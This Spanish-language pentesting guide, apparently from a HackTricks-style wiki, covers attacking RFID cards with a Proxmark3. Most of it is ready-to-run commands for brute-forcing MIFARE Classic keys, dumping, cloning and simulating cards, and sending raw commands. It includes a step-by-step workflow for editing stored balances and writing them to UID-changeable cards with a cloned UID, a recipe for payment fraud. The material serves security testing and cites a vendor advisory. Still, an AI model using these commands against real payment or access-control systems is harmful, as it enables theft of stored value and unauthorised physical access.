# Proxmark 3

{{#include ../../banners/hacktricks-training.md}}

## Atacando sistemas RFID con Proxmark3

Lo primero que necesitas es tener un [**Proxmark3**](https://proxmark.com) y [**instalar el software y sus dependencie**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)[**s**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux).

### Atacando MIFARE Classic 1KB

Tiene **16 sectores**, cada uno con **4 bloques**, y cada bloque contiene **16B**. El UID se encuentra en el sector 0, bloque 0 (y no se puede modificar).\
Para acceder a cada sector necesitas **2 claves** (**A** y **B**), que se almacenan en el **bloque 3 de cada sector** (sector trailer). El sector trailer también almacena los **bits de acceso** que proporcionan los permisos de **lectura y escritura** en **cada bloque** usando las 2 claves.\
Las 2 claves son útiles para proporcionar permisos de lectura si conoces la primera y de escritura si conoces la segunda (por ejemplo).

Se pueden realizar varios ataques
```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```
El Proxmark3 permite realizar otras acciones, como **interceptar** una **comunicación de Tag a Reader**, para intentar encontrar datos sensibles. En esta tarjeta, simplemente podrías hacer sniffing de la comunicación y calcular la clave utilizada, porque las **operaciones criptográficas utilizadas son débiles** y, conociendo el texto plano y el texto cifrado, puedes calcularla (herramienta `mfkey64`).<sup>[[3]](#references)</sup>

#### Flujo de trabajo rápido de MiFare Classic para el abuso de valores almacenados

Cuando los terminales almacenan saldos en tarjetas Classic, un flujo típico de extremo a extremo es:<sup>[[4]](#references)</sup>
```bash
# 1) Recover sector keys and dump full card
proxmark3> hf mf autopwn

# 2) Modify dump offline (adjust balance + integrity bytes)
#    Use diffing of before/after top-up dumps to locate fields

# 3) Write modified dump to a UID-changeable ("Chinese magic") tag
proxmark3> hf mf cload -f modified.bin

# 4) Clone original UID so readers recognize the card
proxmark3> hf mf csetuid -u <original_uid>
```
Notas

- `hf mf autopwn` orquesta ataques de tipo nested/darkside/HardNested, recupera claves y crea dumps en la carpeta de dumps del cliente.<sup>[[1]](#references)</sup>
- La escritura del bloque 0/UID solo funciona en tarjetas magic gen1a/gen2. Las tarjetas Classic normales tienen el UID de solo lectura.<sup>[[2]](#references)</sup>
- Muchas implementaciones usan "value blocks" de Classic o checksums simples. Asegúrate de que todos los campos duplicados/complementados y los checksums sean coherentes después de editarlos.<sup>[[4]](#references)</sup>

Consulta una metodología de nivel superior y las mitigaciones en:

{{#ref}}
pentesting-rfid.md
{{#endref}}

### Comandos Raw

En ocasiones, los sistemas IoT utilizan **tags sin marca o no comerciales**. En este caso, puedes usar Proxmark3 para enviar **comandos raw personalizados a los tags**.
```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
proprietary non iso14443-4 card found, RATS not supported
No chinese magic backdoor command detected
Prng detection: WEAK
Valid ISO14443A Tag Found - Quiting Search
```
Con esta información podrías intentar buscar información sobre la tarjeta y sobre la forma de comunicarte con ella. Proxmark3 permite enviar comandos raw como: `hf 14a raw -p -b 7 26`

### Scripts

El software de Proxmark3 incluye una lista precargada de **scripts de automatización** que puedes usar para realizar tareas sencillas. Para obtener la lista completa, usa el comando `script list`. A continuación, usa el comando `script run`, seguido del nombre del script:
```
proxmark3> script run mfkeys
```
Puedes crear un script para hacer **fuzzing de lectores de tags**. Después de copiar los datos de una **tarjeta válida**, solo tienes que escribir un **script de Lua** que **aleatorice** uno o más **bytes** al azar y comprobar si el **lector falla** en alguna iteración.

## Referencias

- [1] [Proxmark3 wiki: HF MIFARE](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Mifare)
- [2] [Proxmark3 wiki: HF Magic cards](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Magic-cards)
- [3] [NXP statement on MIFARE Classic Crypto1](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
- [4] [NFC card vulnerability exploitation in KioSoft Stored Value (SEC Consult)](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)

{{#include ../../banners/hacktricks-training.md}}
